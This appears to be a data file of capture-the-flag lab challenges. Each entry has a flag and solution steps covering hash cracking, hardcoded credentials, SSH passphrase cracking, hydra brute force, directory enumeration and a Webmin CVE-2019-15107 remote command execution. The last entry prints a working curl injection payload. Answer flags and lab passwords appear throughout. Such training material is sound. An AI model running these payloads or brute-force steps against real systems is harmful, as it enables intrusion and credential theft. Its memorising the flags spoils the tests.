fields.title: MySQL database with MD5 passwords hashes
fields.description: You as a hacker have got access to the machine. There is a MySQL server running on the machine. Probably some database contains a root user's password. Flag: eXpl0it{r00t_sh0uld_c4re_mor3_about_d4tabases}
fields.summary: Get a flag from the root user's home directory on the machine.
steps: List all services running the appropriate command.
Connect to MySQL server running on localhost with default login with no password.
Using MySQL syntax collect passwords hashes.
Now we can save the hashes to a file and crack them for example via `hashcat`.
One of the cracked hashes contains a password for the root user on the system.

fields.title: Hardcoded credentials in a javascript code
fields.description: It is a machine with some dumped backup of a compromised website. The root user uses the same password that was used for access to the website. Flag: eXpl0it{n3v3r_R3lY_on_ObfU5C4t10n_0Nly}
fields.summary: Get a flag from root user's home directory on the machine.
steps: Read notes.txt on the user's Desktop.
Notice that there is info about some obfuscated JavaScript code in the `notes.txt`.
> 2. Push the JS file - IN PROGRESS
> 3. Update the website folder & repo - TO DO
Find a `secret-function.js` file in the `/var/www/secret-website` directory that is dumped from a compromised website by scenario.

After deobfuscating the code using any appropriate tool such as online deobsufcator(https://lelinhtinh.github.io/de4js/) we have a function `login()` with a username(`root`), hostname(`challenge02`), and password(`KgEHHWjzT277saPt`).
Try to login as a `root` on the same machine.

fields.title: SSH passphrase cracking
fields.description: There is a private SSH key on the machine and John The Ripper in the home directory. Need to crack some SSH keys. Flag: eXpl0it{s3t_STroN6_55H_P4ssW0rD_And_pHR4s3}
fields.summary: Get a flag from the user's home directory on the remote victim's machine.
steps: Read notes.txt on the user's Desktop. Find a username(`wolly`), hostname(`challenge03.target`), and even a password(`GGUSqastz74BDSXr`). Additionally, there is an SSH private key.
> 2. Set secure password for the user such as GGUSqastz74BDSXr
> 4. Disallow ssh connection to the machine
Using JTR in the home directory crack the id_rsa passphrase.
Connect via SSH using the username, hostname, password, and passphrase.

fields.title: Login HTTP form bruteforce
fields.description: Brute force credentials for a website using hydra. Flag: eXpl0it{hT7p_f0RM_BruT3_F0rC3_ma7t3R5}
fields.summary: Get a flag from the user's home webpage.
steps: Find a web page on `http://challenge03.target:81` host. There is a login form there. Find a comment using `Inspect element` in your web browser.
<!--Steven! Make sure that you changed your envinonmental password!-->
Now we can make an assumption that the username is `Steven`. Using `hydra` and the wordlist in home directory we can easily brute-force the password.

fields.title: Basic Auth bruteforce
fields.description: There is a Flask application hosted on `challenge05.target` host and the default Flask port. Flag: eXpl0it{Th4ts_b4s1cally_th4t5_34sy}
fields.summary: Get a flag from the web root via `admin` user credentials.
steps: Find a web page hosted on `challenge05.target` host with default flask port `5000`. There is a web page secured with basic auth.
There is a default user with `admin` username. Use `hydra` and a wordlist in the home directory to crack the password for the admin user.

fields.title: Crack targeted victim's ssh password with a custom wordlist
fields.description: Brute force credentials for a website using `hydra` with generated wordlist via `cupp` tool. Flag: eXpl0it{aLW4y5_6eN3r4Te_5tr0nG_pa55W0rd5}
fields.summary: Get a flag from the victim's home directory.
steps: Find file `notes.txt` on the user's desktop.
That should be enough to crack it!
Using the info from the `notes.txt` file and `cupp` tool, generate a wordlist for cracking the Anna's SSH password.
[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)
> Do you want to add some key words about the victim? Y/[N]: N
> Do you want to add special chars at the end of words? Y/[N]: N
> Do you want to add some random numbers at the end of words? Y/[N]:N
[+] Saving dictionary to anna.txt, counting 3452 words.
[+] Now load your pistolero with anna.txt and shoot! Good luck!
Use `hydra` to brute force the password for `apink` user on `challenge06.target` host.

fields.title: PDF password cracking
fields.description: There is a secret PDF file on a desktop with some information. But it's needed to crack the password that protects the file content. Flag: eXpl0it{pdf_Doc_1s_n07_tH3_S4f3sT_sT0r4g3}
fields.summary: Get a flag stored in the file using `pdfcrack` tool.
steps: Find a PDF file on a desktop. Notice that the file is password-protected.
Using the `pdfcrack` and the most popular wordlist `rockyou.txt` it's possible to easily crack the password.

fields.title: Explore Dark Web Village
fields.description: What happens in dark web stays in dark web? Spoiler alert, it doesn't. Dark web is a breeding ground for criminal activities: illicit drugs, credit card markets, forged documents... We invite you to take a look at the dark side, browse our catalogue of deep web sites safely without having to wait a ton to load the page.
fields.summary: Browse the dark web yourself using our systems that are set up to access the underground sites

fields.title: Inspect website sources
fields.description: Discover web application's public source code to get a flag that consists of two parts. Flag: eXpl0it{VIeW_s0uRC3_InsP3CT_elEM3nt}
fields.summary: Browse the dark web yourself using our systems that are set up to access the underground sites
steps: The first part of the flag is on the main web page (`index.html`) - `eXpl0it{VIeW_s0uRC3`.
The second part of the flag is commented in a CSS file of the website (`style.html`) - `_InsP3CT_elEM3nt}`.

fields.title: Hidden directory
fields.description: There is a secret file stored in the php web application `http://challenge02.target/`. Flag: eXpl0it{w0W_HoW_d1d_Y0u_f0unD_th1s}
fields.summary: Get a flag hidden file in the web application.
steps: Find a website on `http://challenge.target:83/`. Using the `dirsearch` tool and the wordlist in the home directory enumerate application endpoints.
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 1070
It is discovered `/secret` path. Now we can enumerate in this directory. As a result, we have the `flag.txt` file.
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 1071

fields.title: Outdated software - Webmin with RCE
fields.description: There is a vulnerable Webmin service hosted on `https://challenge03.target:10000/`. Flag: eXpl0it{r3mot3_C0mm4Nd_eX3cu7i0N_v1a_weB_aPP}
fields.summary: Get a `flag.txt` file stored in the `root` user's directory.
steps: Find WebMin service hosted on default port.

Look for known vulnerabilities for Webmin - `CVE-2019-15107`. An attacker can send a malicious http request to the password reset request form page to inject code and take over the webmin web application.
Send a password change request to exploit the CVE with RCE vulnerability to read the `flag.txt` file.

$ curl -ks 'https://challenge03.target:10000/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=cat+/root/flag.txt&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: https://challenge03.target:10000/session_login.cgi'
Find the flag in the response.
<center><h3>Failed to change password : The current password is incorrecteXpl0it{r3mot3_C0mm4Nd_eX3cu7i0N_v1a_weB_aPP}
